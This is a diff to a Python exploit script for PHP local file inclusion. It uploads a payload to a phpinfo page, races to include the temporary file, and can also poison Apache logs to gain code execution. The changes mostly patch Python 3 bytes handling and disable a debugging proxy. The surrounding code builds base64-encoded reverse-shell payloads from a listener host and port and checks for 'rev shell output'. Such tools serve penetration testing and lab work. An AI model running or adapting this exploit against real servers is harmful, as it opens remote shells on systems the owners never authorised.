@@ -17,7 +17,9 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # proxy set for test
-proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
+# proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
+proxies = None
+
 #http log file paths
 LOG_FILES=["/var/log/apache/access.log",
 "/var/log/apache/error.log",
@@ -186,13 +188,13 @@ def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
   except ValueError:
     return None
   try:
-    d= requests.get(LFI_PATH % fn, verify=False,headers={'Connection':'close'},timeout=10).content
+    d= requests.get(LFI_PATH % str(fn), verify=False,headers={'Connection':'close'},timeout=10).content
   except requests.exceptions.ReadTimeout:
     return fn
   #d = http.request('GET', LFI_PATH % fn, timeout=5).data
   debug(d,VERBOSE)
   if d.find(bytes(TAG, 'UTF-8')) != -1:
-    debug("The rev shell output: "+d,VERBOSE)
+    debug("The rev shell output: "+ str(d),VERBOSE)
     return fn
   else:
     return None
@@ -263,7 +265,7 @@ def controll_log(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    base64revshell=base64.b64encode(TEMPLATES[args.ptype].encode())
+    base64revshell=str(base64.b64encode(TEMPLATES[args.ptype].encode()))
 
     # define the end of lfi request
     if args.reqend != "":
@@ -373,8 +375,7 @@ def main(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    #print(TEMPLATES)
-    base64revshell=base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8'))
+    base64revshell=str(base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8')))
 
     # define the end of lfi request
     if args.reqend != "":
@@ -402,7 +403,7 @@ def main(args):
     files = {'file': ('test.txt',PAYLOAD, 'text/plain')}
 
     debug("\nLFIrequest template : "+LFI_PATH,VERBOSE)
-    response = requests.post(PHPINFO_PATH, files=files,headers=HEADERS, cookies=COOKIES)
+    response = requests.post(PHPINFO_PATH, files=files,headers=HEADERS, cookies=COOKIES, proxies=proxies)
     i = response.content.find(bytes("[tmp_name] =&gt", 'UTF-8'))
     if i == -1:
       raise ValueError("No php tmp_name in phpinfo output")
